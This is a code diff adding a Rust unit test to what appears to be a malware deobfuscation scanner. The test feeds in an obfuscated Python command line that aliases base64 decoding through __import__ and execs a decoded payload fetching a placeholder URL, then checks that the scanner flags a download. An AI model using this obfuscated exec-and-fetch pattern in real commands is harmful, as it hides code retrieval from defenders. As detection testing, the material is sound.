@@ -11180,6 +11180,30 @@ $urlzip = "https://ps.example/stage.zip""#,
     }
 
     #[test]
+    fn python_dunder_import_assigned_b64decode_alias_recurses_into_decoded_source_urls() {
+        use base64::Engine;
+
+        let decoded =
+            "import requests;requests.get('https://py.example/dunder-assigned-alias-inner')";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            &format!(r#"python.exe -c "d = __import__('base64').b64decode; exec(d('{b64}'))""#),
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://py.example/dunder-assigned-alias-inner"
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python __import__ assigned b64 alias source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn python_dunder_import_base64_recurses_into_decoded_source_urls() {
         use base64::Engine;
 
